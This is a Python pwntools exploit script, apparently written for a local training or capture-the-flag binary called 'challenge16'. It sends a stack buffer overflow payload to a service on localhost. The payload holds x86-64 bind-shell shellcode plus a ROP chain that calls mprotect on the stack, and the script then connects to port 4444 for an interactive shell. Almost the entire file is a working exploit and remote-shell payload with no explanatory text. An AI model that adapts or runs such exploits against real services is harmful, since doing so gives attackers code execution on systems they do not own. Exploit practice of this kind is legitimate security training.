#!/usr/bin/python

import struct
from pwn import *

# http://shell-storm.org/shellcode/files/shellcode-78.php
shellcode = ""
shellcode += "\x31\xc0\x31\xdb\x31\xd2\xb0\x01\x89\xc6\xfe\xc0\x89\xc7\xb2"
shellcode += "\x06\xb0\x29\x0f\x05\x93\x48\x31\xc0\x50\x68\x02\x01\x11\x5c"
shellcode += "\x88\x44\x24\x01\x48\x89\xe6\xb2\x10\x89\xdf\xb0\x31\x0f\x05"
shellcode += "\xb0\x05\x89\xc6\x89\xdf\xb0\x32\x0f\x05\x31\xd2\x31\xf6\x89"
shellcode += "\xdf\xb0\x2b\x0f\x05\x89\xc7\x48\x31\xc0\x89\xc6\xb0\x21\x0f"
shellcode += "\x05\xfe\xc0\x89\xc6\xb0\x21\x0f\x05\xfe\xc0\x89\xc6\xb0\x21"
shellcode += "\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68"
shellcode += "\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89"
shellcode += "\xe6\xb0\x3b\x0f\x05\x50\x5f\xb0\x3c\x0f\x05";

e = ELF("./challenge16")
tube = connect("localhost", 5001)

offset = 152

def doBof(payload): 
	print tube.recvuntil("> ")
	tube.send("1");

	print tube.recv()
	tube.send(str(len(payload)));
	
	print tube.recv()
	tube.send(payload)
	
	print tube.recv()
 
def doShell():
	conn = remote('localhost', 4444)
	conn.interactive()


libcBase = 0x00007ffff7a0e000
shellcodeAddr = 0x7fffffffe1e0
stackAddr = shellcodeAddr & ~(4096 - 1) 

print "Shellcode len: " + str(len(shellcode))
print "Stack addr: " + hex(stackAddr)
print "Shellcode:  " + hex(shellcodeAddr)

# shellcode 
payload = shellcode
payload += "A" * (offset - len(shellcode)) 

# rop
payload += p64 ( libcBase + 0x000000000003a718 )  	# 0x000000000003a718: pop rax; ret;
payload += p64 ( 10 )			# syscall sys_mprotect 

payload += p64 ( libcBase + 0x0000000000021102 ) 	# 0x0000000000021102: pop rdi; ret;
payload += p64 ( stackAddr )		# mprotect arg: addr

payload += p64 ( libcBase + 0x00000000000202e8 ) 	# 0x00000000000202e8: pop rsi; ret;
payload += p64 ( 4096 ) 		# mprotect arg: size

payload += p64 ( libcBase + 0x0000000000001b92) 	# 0x0000000000001b92: pop rdx; ret;
payload += p64 ( 0x7 ) 			# protect arg: permissions

payload += p64 ( libcBase + 0x00000000000bb945) # 0x00000000000bb945: syscall; ret; 

payload += p64 ( shellcodeAddr ) 


# execute it
doBof(payload)
doShell()


